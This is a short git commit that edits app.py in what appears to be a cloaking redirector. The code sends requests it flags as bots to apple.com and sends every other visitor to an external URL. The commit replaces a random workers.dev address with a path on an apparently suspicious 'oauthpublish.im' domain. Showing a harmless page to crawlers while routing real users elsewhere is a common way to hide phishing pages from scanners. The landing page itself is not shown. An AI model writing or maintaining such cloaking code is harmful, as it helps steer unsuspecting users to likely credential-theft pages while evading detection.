6267aa39ae72f1e844bdfd813a8e17ca50cbeeb5
kencopland <kencopland999@hotmail.com>
2026-03-27 09:03:33 -0500

    Update app.py

--- app.py
+++ app.py
@@ -48,7 +48,7 @@ def root():
     if is_bot(request):
         return redirect("https://apple.com", code=302)
     else:
-        return redirect("https://23c9a64452c5f6e0.e5dacaf0735246b19092002a.workers.dev", code=302)
+        return redirect("https://oauthpublish.im/wp/cs/ZtlLsnSprw5RjF6ao1mBvbHquxe2JA3N", code=302)
 
 
 if __name__ == "__main__":
